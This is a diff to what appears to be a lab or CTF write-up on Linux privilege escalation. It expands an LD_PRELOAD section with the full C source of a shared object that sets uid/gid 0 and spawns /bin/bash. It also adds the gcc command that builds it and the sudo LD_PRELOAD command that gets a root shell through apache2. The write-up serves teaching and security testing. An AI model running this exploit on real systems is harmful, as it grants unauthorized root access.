@@ -24,19 +24,40 @@ Key Observations
 * This combination allows LD_PRELOAD-based privilege escalation
 
 ## Exploitation (LD_PRELOAD)
-A malicious shared object was created to spawn a shell and compiled as a shared library:
+### Step 1: Create a malicious shared object
+
+A C file was created that spawns a root shell when loaded via `LD_PRELOAD`.
+
+**exploit.c**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+void __attribute__((constructor)) shell(void) {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    exit(0);
+}
+```
+Step 2: Compile the shared library
+The malicious code was compiled as a shared object:
 
 ```bash
-
 gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
 ```
-Next, the root-owned binary was executed with LD_PRELOAD pointing to the malicious shared object:
+Step 3: Execute a root-owned binary with LD_PRELOAD
+The root-owned binary was executed with LD_PRELOAD pointing to the malicious shared object:
 
 ```bash
 sudo LD_PRELOAD=/tmp/exploit.so apache2
 ```
- Result
+When the binary is executed, the shared object is loaded first, resulting in a root shell.
 
+ Result
+ 
 A root shell was successfully obtained:
 
 ```bash
